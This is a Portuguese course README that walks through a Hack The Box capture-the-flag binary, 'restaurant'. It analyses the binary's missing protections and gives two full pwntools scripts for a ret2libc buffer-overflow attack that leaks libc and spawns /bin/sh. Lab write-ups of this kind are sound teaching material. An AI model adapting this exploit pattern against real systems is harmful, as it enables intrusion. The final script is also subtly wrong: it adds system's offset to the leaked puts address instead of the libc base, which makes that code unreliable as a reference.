# pwn
Prática sobre pwn referente à matéria de Segurança Cibernética

Resolução do exercício do site [Hack The Box](https://app.hackthebox.com/challenges/restaurant)

## Descrição do problema
Bem-vindo ao nosso restaurante. Aqui você pode comer e beber o quanto quiser! Só não exagere...

## Analisando o problema
Descompactando o arquivo .zip, resulta em 2 arquivos: um arquivo de biblioteca libc e um arquivo binário.

![image](https://github.com/caiocadini/pwn/assets/100872066/8251a5e2-8a68-49e8-93a1-1a266c184bc0)

Vamos verificar o tipo binário e suas proteções.

![image](https://github.com/caiocadini/pwn/assets/100872066/aa470b42-aaef-4d31-a8a3-e2fedff9ab6e "Arquivo binário de 64 bits, vinculado dinamicamente, não removido.")

![image](https://github.com/caiocadini/pwn/assets/100872066/ba76af3c-a1c8-4d19-807b-7aecf99fe7f8 "Nenhum Canário Encontrado, Sem PIE (ASLR desabilitado)")

Utilizando o pwn checksec, que verifica as configurações de segurança de um arquivo ELF, podemos observar 'No canary found'. Stack canaries são usados para detectar e prevenir buffer overflow. 'No canary found' significa que essa proteção não está presente, tornando o binário mais suscetível a ataques de buffer overflow no stack.

Além disso, o PIE (Position Independent Executable) não está habilitado, significando que o binário é sempre carregado no mesmo endereço de memória cada vez que é executado.

Somando o fato de possuirmos o arquivo da libc, o ataque será um ataque ret2libc, que consiste em um buffer overflow em que o endereço de retorno da função chamada na pilha é substituído pelo endereço de uma outra instrução, e uma parte da pilha é sobrescrita para fornecer argumentos para está função. Apontando o retorno para a libc, podemos utilizar as funções dela para executar alguma chamada.


![função main do binário](https://github.com/caiocadini/pwn/assets/100872066/afa0fe88-66e2-4d79-bc03-ca466a5d2676 "Função main")


Analisando a função principal, se a entrada do usuário for 1, o usuário deverá pular para a função fill() e se a entrada for 2, o usuário deverá pular para a função drink(). Vamos verificar fill() primeiro.

![função fill do binário](https://github.com/caiocadini/pwn/assets/100872066/cd33ee9a-5926-4596-9d82-a3b56f1580e1 "Função fill")


Observe que podemos vazar o endereço de tempo de execução da libc por meio da chamada puts. Também podemos estourar o buffer da variável local_28 para controlar o RIP. Vamos verificar a função drink() agora.

![função drink do binário](https://github.com/caiocadini/pwn/assets/100872066/622371a3-4739-4fd6-ad0e-3a4dc2ce72fc "Função drink")


Nada de interessante aqui, parece que a função fill() será de nosso interesse agora.

## Vazando o endereço de tempo de execução libc

### Obtenha o deslocamento RIP

Vamos obter o deslocamento RIP usando gdb enviando 1025 bytes.

Para enviarmos uma quantidade específica de bytes para um programa usando o GDB (GNU Debugger) precisamos fazer alguns comandos:

Iniciar o GDB:
```
gdb ./restaurant
```

Configurar o GDB para permitir a execução de scripts Python:
```
gdb -q --batch -ex "run" -ex "set disassembly-flavor intel" -ex "source seu_script.py" ./restaurant
```

Criar um breakpoint no local que deseja interromper a execução para enviar os bytes:
```
break *0xendereço
```

Executar o programa até o breakpoint:
```
run
```

Enviar os bytes quando o breakpoint for atingido:

Geralmente, isso é feito de fora do GDB, preparando a entrada para o programa. Por exemplo, se o programa espera entrada do usuário, você pode enviar os bytes através da entrada padrão ou através de um arquivo. Se você estiver enviando uma carga útil que é um padrão de bytes, você pode criar a carga útil com uma ferramenta como pattern_create no Metasploit ou escrever um pequeno script para gerar a carga útil.

Continuar a execução até o programa crashar:
```
continue
```

Agora sabemos que o preenchimento que enviaremos para controlar o RIP é de 40 bytes e como queremos vazar o endereço de tempo de execução da libc por meio de puts, precisamos pegar o endereço de puts@plt e puts@got, porque queremos que as puts chamem puts -> puts(puts).

Em x86_64, se quisermos passar 1 argumento para um parâmetro de função, precisamos do gadget pop rdi, então estamos lançando puts@got como argumento para puts@plt. Para evitar que o programa trave, devemos fazer com que a função main() ou fill() seja chamada em seguida, antes de vazar o tempo de execução da libc.

### Pegando o puts@plt

Para obter o endereço da função puts na PLT (Procedure Linkage Table) usamos o GDB
```
gdb ./nome_do_programa
info functions puts
print puts
```

Pegando o puts@got
```
puts_got = elf.got['puts']
info('Puts GOT: %#0x', puts_got)
```

Obtenha o gadget pop rdi. Este comando irá desmontar as instruções no endereço fornecido, permitindo que você verifique se há um pop rdi seguido por um ret.
```
x/3i endereco_gadget
```

Obtenha o endereço fill():
```
gdb ./restaurant
info functions fill // Isso deve fornecer o endereço da função fill() se ela estiver presente no símbolo do programa.
print fill // Isso imprimirá o endereço de fill()
```

### Criando o script
O código é um script em Python que utiliza a biblioteca pwntools, uma ferramenta para a criação de exploits especialmente em competições de CTF e pentests.

```
from pwn import *
import os
import time

os.system('clear')

'''
A função exploit é um wrapper que decide se deve iniciar uma conexão remota para um serviço (se o exploit estiver sendo executado com a flag REMOTE) ou se deve iniciar um processo local do programa restaurant.
'''
def exploit(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)


'''
Definimos o caminho para o executável do programa restaurant e em seguida, carrega suas informações usando ELF (uma classe de pwntools para executáveis ELF), e define o nível de log para "debug" para que pwntools mostre mais informações sobre o que está acontecendo durante a execução do exploit.
'''
exe = './restaurant'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'


lib = './libc.so.6' # set the libc library
libc = context.binary = ELF(lib, checksec=False)

sh = exploit()

padding = 40 

'''
Aqui definimos endereços fixos para puts na Procedure Linkage Table (PLT), na Global Offset Table (GOT), um gadget pop rdi (usado para controlar o que é colocado no registro RDI), e o endereço da função fill no binário restaurant. Eles são usados para construir o payload.
'''
puts_plt = 0x0000000000400650 # elf.plt['puts']
info('Puts PLT: %#0x', puts_plt)

puts_got = elf.got['puts']
info('Puts GOT: %#0x', puts_got)

pop_rdi_gadget = 0x00000000004010a3
info('Pop RDI: %#0x', pop_rdi_gadget)

fill_addr = elf.sym['fill']
info('Fill address: %#0x', fill_addr)

'''
Aqui construimos o payload. Ele começa com uma série de instruções nop para o padding, seguido pelo endereço do gadget pop rdi, o endereço de puts na GOT (que será o primeiro argumento para puts), o endereço de puts na PLT (que será chamado), e finalmente o endereço da função fill para retornar após a execução de puts, evitando assim que o programa trave.
'''

p = flat([
    asm('nop') * padding, # add padding
    pop_rdi_gadget, 
    puts_got, # rdi is pointing to this (holds the 1st arg)
    puts_plt, # plt puts as a func exec plt got as the arg
    fill_addr # get back to fill func to prevent crash
])

'''
Aqui enviamos o payload para o programa restaurant. sendlineafter é uma função de pwntools que espera por uma string específica (neste caso, o prompt '>') e então envia uma string (primeiro '1', depois o payload).
'''

sh.sendlineafter(b'>', b'1') # input 1
sh.sendlineafter(b'>', p) # send the payload


sh.interactive()
```

### Fase final
```
from pwn import *
import os
import time
os.system('clear')

def exploit(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './restaurant'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

lib = './libc.so.6' # set the libc library
libc = context.binary = ELF(lib, checksec=False)

sh = exploit()

padding = 40 

puts_plt = 0x0000000000400650 # elf.plt['puts']
info('Puts PLT: %#0x', puts_plt)

puts_got = elf.got['puts']
info('Puts GOT: %#0x', puts_got)

pop_rdi_gadget = 0x00000000004010a3
info('Pop RDI: %#0x', pop_rdi_gadget)

fill_addr = elf.sym['fill']
info('Fill address: %#0x', fill_addr)

p = flat([
    asm('nop') * padding, # add padding
    pop_rdi_gadget, 
    puts_got, # rdi is pointing to this (holds the 1st arg)
    puts_plt, # plt puts as a func exec plt got as the arg
    fill_addr # get back to fill func to prevent crash
])

sh.sendlineafter(b'>', b'1') # input 1
sh.sendlineafter(b'>', p) # send the payload

getLeaked = sh.recvline_startswith('Enjoy your')
# assume (little-endian) , grabbing the least significant bytes.
leakedLibc = unpack(getLeaked[-6:].ljust(8,b'\x00')) 
info('Leaked got.puts address: %#0x', leakedLibc)

# leaked got.put + puts in libc
libc_base = leakedLibc - libc.sym['puts'] # get the puts with pwntools
info('Libc base: %#0x', libc_base)

shell = next(libc.search(b'/bin/sh\x00')) # grab the 1st result from the libc
info('Shell: %#0x', shell)
bin_sh = libc_base + shell
info('/bin/sh address: %#0x', bin_sh)

system = leakedLibc + libc.sym['system']
info('System Address: %#0x', system)

pay = flat([
    #1st payload
    asm('nop') * padding,
    pop_rdi_gadget,
    puts_got,
    puts_plt,

    #2nd payload
    pop_rdi_gadget,
    bin_sh,
    system
])

sh.sendlineafter(b'>', pay)

sh.interactive()
```


